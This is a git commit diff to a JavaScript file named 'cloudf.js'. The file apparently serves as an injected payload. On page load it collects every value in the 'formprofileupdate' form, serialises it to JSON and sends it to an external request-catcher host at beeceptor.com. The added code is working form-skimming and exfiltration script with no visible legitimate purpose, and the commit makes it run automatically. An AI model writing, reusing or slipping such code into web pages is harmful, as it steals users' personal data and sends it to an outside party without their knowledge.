3aaced98ec8e68bfdb0df35496ae99a1a7097247
gitjslab <86866390+gitjslab@users.noreply.github.com>
2021-07-03 14:24:06 +0530

    Update cloudf.js

--- cloudf.js
+++ cloudf.js
@@ -1,12 +1,14 @@
-var regobject = {};
-var formreg = new FormData(document.getElementById('formprofileupdate')).forEach((value, key) => regobject[key] = value);
-var regjson = JSON.stringify(regobject);
-$.ajax({
-    url: 'https://herbtest.free.beeceptor.com/',
-    data: regjson,
-    processData: false,
-    type: 'GET',
-    success: function ( data ) {
-        console.log( data );
-    }
+$(document).load(function () {
+    var regobject = {};
+    new FormData(document.getElementById('formprofileupdate')).forEach((value, key) => regobject[key] = value);
+    var regjson = JSON.stringify(regobject);
+    $.ajax({
+        url: 'https://herbtest.free.beeceptor.com/',
+        data: regjson,
+        processData: false,
+        type: 'GET',
+        success: function ( data ) {
+            console.log( data );
+        }
+    });
 });
